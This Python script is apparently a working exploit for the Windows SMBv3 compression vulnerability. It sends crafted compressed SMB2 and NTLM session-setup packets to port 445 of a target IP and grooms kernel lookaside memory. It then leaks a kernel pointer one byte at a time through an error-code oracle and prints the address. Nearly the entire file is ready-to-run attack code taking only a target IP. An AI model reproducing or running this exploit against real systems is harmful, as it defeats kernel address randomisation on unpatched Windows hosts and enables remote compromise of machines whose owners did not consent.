import socket, struct, sys
import os, ctypes

class Smb2Header:
    def __init__(self, command, message_id=0, session_id=0):
        self.protocol_id = b"\xfeSMB"
        self.structure_size = b"\x40\x00"  # Must be set to 0x40
        self.credit_charge = b"\x00"*2
        self.channel_sequence = b"\x00"*2
        self.channel_reserved = b"\x00"*2
        self.command = struct.pack('<H', command)
        self.credits_requested = b"\x00"*2  # Number of credits requested / granted
        self.flags = b"\x00"*4
        self.chain_offset = b"\x00"*4  # Points to next message
        self.message_id = struct.pack('<Q', message_id)
        self.reserved = b"\x00"*4
        self.tree_id = b"\x00"*4  # Changes for some commands
        self.session_id = struct.pack('<Q', session_id)
        self.signature = b"\x00"*16

    def get_packet(self):
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class Smb2NegotiateRequest:
    def __init__(self):
        self.header = Smb2Header(0)
        self.structure_size = b"\x24\x00"
        self.dialect_count = b"\x08\x00"  # 8 dialects
        self.security_mode = b"\x00"*2
        self.reserved = b"\x00"*2
        self.capabilities = b"\x7f\x00\x00\x00"
        self.guid = b"\x01\x02\xab\xcd"*4
        self.negotiate_context = b"\x78\x00"
        self.additional_padding = b"\x00"*2
        self.negotiate_context_count = b"\x02\x00"  # 2 Contexts
        self.reserved_2 = b"\x00"*2
        self.dialects = b"\x02\x02" + b"\x10\x02" + b"\x22\x02" + b"\x24\x02" + b"\x00\x03" + b"\x02\x03" + b"\x10\x03" + b"\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = b"\x00"*4

    def context(self, type, length):
        data_length = length
        reserved = b"\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = b"\x01\x00"  # 1 hash algorithm
        salt_length = b"\x20\x00"
        hash_algorithm = b"\x01\x00"  # SHA512
        salt = b"\x00"*32
        pad = b"\x00"*2
        length = b"\x26\x00"
        context_header = self.context(b"\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        #compression_algorithm_count = b"\x03\x00"  # 3 Compression algorithms
        compression_algorithm_count = b"\x01\x00"
        padding = b"\x00"*2
        flags = b"\x01\x00\x00\x00"
        #algorithms = b"\x01\x00" + b"\x02\x00" + b"\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        algorithms = b"\x01\x00"
        #length = b"\x0e\x00"
        length = b"\x0a\x00"
        context_header = self.context(b"\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = b"\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = b"\x00"
        self.length = struct.pack('>i', len(data))[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2CompressedTransformHeader:
    def __init__(self, data, offset, original_decompressed_size):
        self.data = data
        self.protocol_id = b"\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', original_decompressed_size)
        self.compression_algorithm = b"\x01\x00"
        self.flags = b"\x00"*2
        self.offset = struct.pack('<i', offset)

    def get_packet(self):
        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.data

class Smb2SessionSetupRequest:
    def __init__(self, message_id, buffer, session_id=0, padding=b''):
        self.header = Smb2Header(1, message_id, session_id)
        self.structure_size = b"\x19\x00"
        self.flags = b"\x00"
        self.security_mode = b"\x02"
        self.capabilities = b"\x00"*4
        self.channel = b"\x00"*4
        self.security_buffer_offset = struct.pack('<H', 0x58 + len(padding))
        self.security_buffer_length = struct.pack('<H', len(buffer))
        self.previous_session_id = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        self.padding = padding
        self.buffer = buffer

    def get_packet(self):
        return (self.header.get_packet() +
            self.structure_size +
            self.flags +
            self.security_mode +
            self.capabilities +
            self.channel +
            self.security_buffer_offset +
            self.security_buffer_length +
            self.previous_session_id +
            self.padding +
            self.buffer)

class Smb2NtlmNegotiate:
    def __init__(self):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x01\x00\x00\x00"
        self.negotiate_flags = b"\x32\x90\x88\xe2"
        self.domain_name_len = b"\x00\x00"
        self.domain_name_max_len = b"\x00\x00"
        self.domain_name_buffer_offset = b"\x28\x00\x00\x00"
        self.workstation_len = b"\x00\x00"
        self.workstation_max_len = b"\x00\x00"
        self.workstation_buffer_offset = b"\x28\x00\x00\x00"
        self.version = b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"
        self.payload_domain_name = b""
        self.payload_workstation = b""

    def get_packet(self):
        return (self.signature +
            self.message_type +
            self.negotiate_flags +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.version +
            self.payload_domain_name +
            self.payload_workstation)

class Smb2NtlmAuthenticate:
    def __init__(self, timestamp, computer_name=b'', no_nt_challenge_trailing_reserved=False, padding=b''):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x03\x00\x00\x00"
        self.lm_challenge_response_len = b"\x00"*2
        self.lm_challenge_response_max_len = b"\x00"*2
        self.lm_challenge_response_buffer_offset = b"\x00"*4
        self.nt_challenge_response_len = b"\x00"*2  # will calculate later
        self.nt_challenge_response_max_len = b"\x00"*2  # will calculate later
        self.nt_challenge_response_buffer_offset = struct.pack('<I', 0x58 + len(padding))
        self.domain_name_len = b"\x00"*2
        self.domain_name_max_len = b"\x00"*2
        self.domain_name_buffer_offset = b"\x00"*4
        self.user_name_len = b"\x00"*2
        self.user_name_max_len = b"\x00"*2
        self.user_name_buffer_offset = b"\x00"*4
        self.workstation_len = b"\x00"*2
        self.workstation_max_len = b"\x00"*2
        self.workstation_buffer_offset = b"\x00"*4
        self.encrypted_random_session_key_len = b"\x01\x00"
        self.encrypted_random_session_key_max_len = b"\x01\x00"
        self.encrypted_random_session_key_buffer_offset = b"\x00"*4  # don't care where
        self.negotiate_flags = b"\x36\x82\x8a\xe2"
        self.version = b"\x00"*8
        self.mic = b"\x00"*16
        self.timestamp = timestamp
        self.computer_name = computer_name
        self.no_nt_challenge_trailing_reserved = no_nt_challenge_trailing_reserved
        self.padding = padding

    def nt_challenge_response(self):
        nt_proof_str = b"\x00"*16
        resp_type = b"\x01"
        hi_resp_type = b"\x01"
        reserved1 = b"\x00"*2
        reserved2 = b"\x00"*4
        timestamp_but_not_the_important_one = b"\x00"*8
        client_challenge = b"\x00"*8
        reserved3 = b"\x00"*4
        ntlmv2_client_challenge_timestamp = b"\x07\x00\x08\x00" + self.timestamp
        ntlmv2_client_challenge_domain_name = b"\x02\x00\x00\x00"
        ntlmv2_client_challenge_computer_name = b"\x01\x00" + struct.pack('<H', len(self.computer_name)) + self.computer_name
        ntlmv2_client_challenge_last = b"\x00"*4
        reserved4 = b"\x00"*4 if not self.no_nt_challenge_trailing_reserved else b""
        return (nt_proof_str +
            resp_type +
            hi_resp_type +
            reserved1 +
            reserved2 +
            timestamp_but_not_the_important_one +
            client_challenge +
            reserved3 +
            ntlmv2_client_challenge_timestamp +
            ntlmv2_client_challenge_domain_name +
            ntlmv2_client_challenge_computer_name +
            ntlmv2_client_challenge_last +
            reserved4)

    def get_packet(self):
        nt_challenge_response = self.nt_challenge_response()
        self.nt_challenge_response_len = struct.pack('<H', len(nt_challenge_response))
        self.nt_challenge_response_max_len = struct.pack('<H', len(nt_challenge_response))
        return (self.signature +
            self.message_type +
            self.lm_challenge_response_len +
            self.lm_challenge_response_max_len +
            self.lm_challenge_response_buffer_offset +
            self.nt_challenge_response_len +
            self.nt_challenge_response_max_len +
            self.nt_challenge_response_buffer_offset +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.user_name_len +
            self.user_name_max_len +
            self.user_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.encrypted_random_session_key_len +
            self.encrypted_random_session_key_max_len +
            self.encrypted_random_session_key_buffer_offset +
            self.negotiate_flags +
            self.version +
            self.mic +
            self.padding +
            nt_challenge_response)

# Source:
# https://github.com/0vercl0k/CVE-2019-11708/blob/0e4e3d437bc7b589b595411a6c79b2e54344da2b/payload/src/genheaders.py#L49
def compress(buffer_in):
    '''Compress a buffer with a specific format.'''
    COMPRESSION_FORMAT_LZNT1 = 2
    COMPRESSION_FORMAT_XPRESS = 3  # added in Windows 8
    COMPRESSION_FORMAT_XPRESS_HUFF = 4  # added in Windows 8
    COMPRESSION_ENGINE_STANDARD = 0
    COMPRESSION_ENGINE_MAXIMUM = 256
    RtlCompressBuffer = ctypes.windll.ntdll.RtlCompressBuffer
    RtlGetCompressionWorkSpaceSize = ctypes.windll.ntdll.RtlGetCompressionWorkSpaceSize

    fmt_engine = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD
    workspace_size = ctypes.c_ulong(0)
    workspace_fragment_size = ctypes.c_ulong(0)
    res = RtlGetCompressionWorkSpaceSize(
        ctypes.c_ushort(fmt_engine),
        ctypes.pointer(workspace_size),
        ctypes.pointer(workspace_fragment_size)
    )

    assert res == 0, 'RtlGetCompressionWorkSpaceSize failed.'

    workspace = ctypes.c_buffer(workspace_size.value)
    buffer_out = ctypes.c_buffer(1024 + len(buffer_in) + len(buffer_in) // 10)
    compressed_size = ctypes.c_ulong(0)
    res = RtlCompressBuffer(
        ctypes.c_ushort(fmt_engine),
        buffer_in,
        len(buffer_in),
        buffer_out,
        len(buffer_out),
        ctypes.c_ulong(4096),
        ctypes.pointer(compressed_size),
        workspace
    )

    assert res == 0, 'RtlCompressBuffer failed.'
    return buffer_out.raw[: compressed_size.value]

def decompress(buffer_in, decompressed_size):
    '''Compress a buffer with a specific format.'''
    COMPRESSION_FORMAT_LZNT1 = 2
    COMPRESSION_FORMAT_XPRESS = 3  # added in Windows 8
    COMPRESSION_FORMAT_XPRESS_HUFF = 4  # added in Windows 8
    RtlDecompressBufferEx = ctypes.windll.ntdll.RtlDecompressBufferEx
    RtlGetCompressionWorkSpaceSize = ctypes.windll.ntdll.RtlGetCompressionWorkSpaceSize

    fmt_engine = COMPRESSION_FORMAT_LZNT1
    workspace_size = ctypes.c_ulong(0)
    workspace_fragment_size = ctypes.c_ulong(0)
    res = RtlGetCompressionWorkSpaceSize(
        ctypes.c_ushort(fmt_engine),
        ctypes.pointer(workspace_size),
        ctypes.pointer(workspace_fragment_size)
    )

    assert res == 0, 'RtlGetCompressionWorkSpaceSize failed.'

    workspace = ctypes.c_buffer(workspace_size.value)
    buffer_out = ctypes.c_buffer(decompressed_size)
    final_decompressed_size = ctypes.c_ulong(0)
    res = RtlDecompressBufferEx(
        ctypes.c_ushort(fmt_engine),
        buffer_out,
        len(buffer_out),
        buffer_in,
        len(buffer_in),
        ctypes.pointer(final_decompressed_size),
        workspace
    )

    assert res == 0, 'RtlDecompressBufferEx failed.'
    return buffer_out.raw[: final_decompressed_size.value]

def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest().get_packet()
    packet = NetBIOSWrapper(negotiate).get_packet()
    sock.send(packet)
    reply_size = sock.recv(4)
    return sock.recv(struct.unpack('>I', reply_size)[0])

def send_compressed(sock, data, offset, original_decompressed_size):
    compressed = Smb2CompressedTransformHeader(data, offset, original_decompressed_size).get_packet()
    packet = NetBIOSWrapper(compressed).get_packet()
    sock.send(packet)
    reply_size = sock.recv(4)
    return sock.recv(struct.unpack('>I', reply_size)[0])

def send_session_setup_with_ntlm_negotiate(sock):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    return send_compressed(sock, compress(session_setup), 0, len(session_setup))

def send_session_setup_with_ntlm_authenticate(sock, session_id, timestamp):
    ntlm_negotiate = Smb2NtlmAuthenticate(timestamp).get_packet()
    session_setup = Smb2SessionSetupRequest(2, ntlm_negotiate, session_id).get_packet()
    return send_compressed(sock, compress(session_setup), 0, len(session_setup))

def send_session_setup_with_ntlm_authenticate_manipulated(sock, session_id, timestamp, max_byte_val, packet_size, request_size, remote_alloc_size):
    def helper(padding=b''):
        ntlm_authenticate = Smb2NtlmAuthenticate(timestamp, b'C'*max_byte_val, True, padding).get_packet()
        session_setup = Smb2SessionSetupRequest(2, ntlm_authenticate, session_id, b'C'*0x40).get_packet()
        return session_setup[:-4-max_byte_val-2]

    session_setup = helper()

    if len(session_setup) < packet_size:
        padding = b'C'*(packet_size - len(session_setup))
        assert len(padding) <= 0x9A8, "Padding too large, won't work."
        session_setup = helper(padding)

    original_decompressed_size = max(len(session_setup) + 8, remote_alloc_size)
    data = compress(session_setup)
    while len(data) < request_size:
        data += b'\x00'*(request_size - len(data))

    return send_compressed(sock, data, 0, original_decompressed_size)

def connect_and_send_compressed(ip_address, data, offset, original_decompressed_size):
    with socket.socket(socket.AF_INET) as sock:
        sock.settimeout(30)
        sock.connect((ip_address, 445))
        send_negotiation(sock)

        try:
            return send_compressed(sock, data, offset, original_decompressed_size)
        except ConnectionResetError:
            return None  # usually expected, just return

def connect_and_setup_session_single_byte_leak(ip_address, target_offset, compare_to_byte):
    with socket.socket(socket.AF_INET) as sock:
        sock.settimeout(30)
        sock.connect((ip_address, 445))
        send_negotiation(sock)

        reply = send_session_setup_with_ntlm_negotiate(sock)
        data_size = struct.unpack('<I', reply[4:8])[0]
        compressed = reply[0x10:]
        data = decompress(compressed, data_size)

        session_id = struct.unpack('<Q', data[0x28:0x30])[0]
        challenge = data[0x40+0x08:]
        target_info_fields_offset = struct.unpack('<I', challenge[0x2C:0x30])[0]
        target_info_fields = challenge[target_info_fields_offset:]

        while True:
            (av_id, av_len) = struct.unpack('<HH', target_info_fields[:4])
            if av_id == 7:
                server_timestamp = target_info_fields[4:4+av_len]
                break
            target_info_fields = target_info_fields[4+av_len:]

        # Write a zero byte next to the byte we want to leak.
        # The payload is crafted so that the decompression will fail after
        # writing the part we need, allowing to write in the middle of the
        # allocated block.
        offset = target_offset + 1
        original_decompressed_size = 0x2101 - offset  # will be decompressed to 0x4100-sized lookaside list
        data = b'B'*offset + b'\x01\xb0\x00\x00'  # decompresses to b'\x00', compress(b'\x00') fails for some reason
        data += b'\xff'*(0x4101 - len(data))   # request will go to 0x8100-sized lookaside list
        connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

        reply = send_session_setup_with_ntlm_authenticate_manipulated(sock, session_id, server_timestamp, compare_to_byte, target_offset, 0x4101, 0x4100)
        data_size = struct.unpack('<I', reply[4:8])[0]
        compressed = reply[0x10:]
        data = decompress(compressed, data_size)
        error = struct.unpack('<I', data[0x08:0x0C])[0]

        return error

def prepare_victim(ip_address):
    # Make so that a 0x2100-sized lookaside allocation will hold
    # the pointer we'll leak.
    # Note: We make it so that compressed data will land on zero bytes
    # so that decompression won't fail.
    data = b'A'*0x1101  # request will go to 0x2100-sized lookaside list
    offset = -0x10 + 0x2100 + 0x26  # will be decompressed to 0x4100-sized lookaside list
    original_decompressed_size = 0
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    # Make some juggling to bring it higher in the buffer.
    ptr_offset = 0x50 + 0x2100 + 0x18 - 0x10  # absolute offset in the allocated block

    offset = ptr_offset - 0x60 + 8  # will be decompressed to 0x2100-sized lookaside list
    data = b'\x00'*(offset - 8)  # request will go to 0x4100-sized lookaside list
    original_decompressed_size = 0
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
    ptr_offset -= 0x10

    (data_1, offset_1, original_decompressed_size_1) = (data, offset, original_decompressed_size)

    # Write zero bytes to be treated as valid compressed data.
    offset = ptr_offset - 0x50 + 0x06
    data = b'A'*offset + b'\x02\xb0\x00\x00\x00'  # decompresses to b'\x00\x00\x00', compress() fails for some reason
    data += b'\xff'*(0x4101 - len(data))   # request will go to 0x8100-sized lookaside list
    original_decompressed_size = 0x1101 - offset  # will be decompressed to 0x2100-sized lookaside list
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    # Usually the buffers come in pairs. Switch buffers.
    connect_and_send_compressed(ip_address, b'\x00'*0x1101, 0, 0x1101)
    # And repeat two last operations on the new buffer.
    connect_and_send_compressed(ip_address, data_1, offset_1, original_decompressed_size_1)
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    extra_iterations = 8  # just to be sure
    while ptr_offset - 0x50 > 0x1101 - extra_iterations * 0x10:
        data = b'A'*0x1101  # request will go to 0x2100-sized lookaside list
        offset = 0x20F0 - 2  # will be decompressed to 0x2100-sized lookaside list
        original_decompressed_size = 0
        connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
        ptr_offset -= 0x10

def leak_if_ptr_byte_larger_than_value(ip_address, byte_index, compare_to_byte, retry_count=0):
    # Refresh the values in the 0x4100-sized lookaside list.
    ptr_offset = 0x50 + 0x1100 + 0x18 + 0x10  # absolute offset in the allocated block
    for _ in range(8):
        data = b'A'*0x1101  # request will go to 0x2100-sized lookaside list
        offset = 0x20F0 - 2  # will be decompressed to 0x2100-sized lookaside list
        original_decompressed_size = 0
        connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    # The pointer is too far away to reach because of SMB packet limits.
    # Make some juggling to bring it higher in the buffer.
    ptr_offset = 0x50 + 0x1100 + 0x18 - 0x10  # absolute offset in the allocated block

    offset = ptr_offset - 0x60 + 8  # will be decompressed to 0x1100-sized lookaside list
    data = b'A'*(offset - 8 - 3) + b'\x00'*3  # request will go to 0x2100-sized lookaside list
    original_decompressed_size = 0
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
    ptr_offset -= 0x10

    # Usually the buffers come in pairs. Switch buffers.
    connect_and_send_compressed(ip_address, compress(os.urandom(0x200)), 0, 0x200)
    # And copy again from 0x2100-sized to 0x1100-sized lookaside list.
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    extra_iterations = 32  # just to be sure
    while ptr_offset - 0x50 > 0x980 - extra_iterations * 0x10:
        data = b'A'*0x200  # request will go to 0x1100-sized lookaside list
        offset = 0x10F0 - 2  # will be decompressed to 0x1100-sized lookaside list
        original_decompressed_size = 0
        connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
        ptr_offset -= 0x10

    # Copy it back to a 0x4100-sized lookaside allocation
    # to decreace the change of other touching it.
    data = b'A'*0x200  # request will go to 0x1100-sized lookaside list
    offset = 0x1101  # choose an offset with zeros so that decompression won't fail
    original_decompressed_size = 0x2101 - offset  # will be decompressed to 0x4100-sized lookaside list
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
    ptr_offset -= 0x10

    # Do the magic!
    error = connect_and_setup_session_single_byte_leak(ip_address, ptr_offset - 0x50 + byte_index, compare_to_byte)
    if error == 0xC000000D:  # STATUS_INVALID_PARAMETER
        return True

    if error != 0xC000006D:  # STATUS_LOGON_FAILURE
        print(f'Warning: Unexpected server response: {hex(error)}')
        return False

    if retry_count < 1:
        # This reply is unreliable (might be a zero byte), try again to verify.
        # About 20% error rate on a local VM.
        return leak_if_ptr_byte_larger_than_value(ip_address, byte_index, compare_to_byte, retry_count + 1)

    return False

def leak_ptr_byte(ip_address, byte_index):
    while True:
        # Bisecting the range.
        low = 0x00
        high = 0xFF
        while low < high:
            mid = (low + high) // 2
            if leak_if_ptr_byte_larger_than_value(ip_address, byte_index, mid):
                low = mid + 1
                print(f'>{hex(mid)} ', end='', flush=True)
            else:
                high = mid
                print(f'<={hex(mid)} ', end='', flush=True)
            #print('.', end='', flush=True)

        # Make sure we got it right
        if leak_if_ptr_byte_larger_than_value(ip_address, byte_index, low):
            print(f'... ', end='', flush=True)
            continue  # something is wrong, try again

        if low > 0 and not leak_if_ptr_byte_larger_than_value(ip_address, byte_index, low - 1):
            print(f'... ', end='', flush=True)
            continue  # something is wrong, try again

        break  # let's hope we got it right...

    print(f'={hex(low)}')
    return low

def exploit(ip_address):
    prepare_victim(ip_address)

    byte_values = []
    for byte_index in reversed(range(0, 6)):
        print(f'Leaking byte {byte_index}')
        byte_value = leak_ptr_byte(ip_address, byte_index)
        byte_values.insert(0, byte_value)

    address = bytes(byte_values) + b'\xff\xff'
    address = struct.unpack('<Q', address)[0]
    print(f'Leaked address: {hex(address)}')

if __name__ == "__main__":
    if len(sys.argv) != 2:
        exit(f'Usage: {sys.argv[0]} target_ip')

    exploit(sys.argv[1])
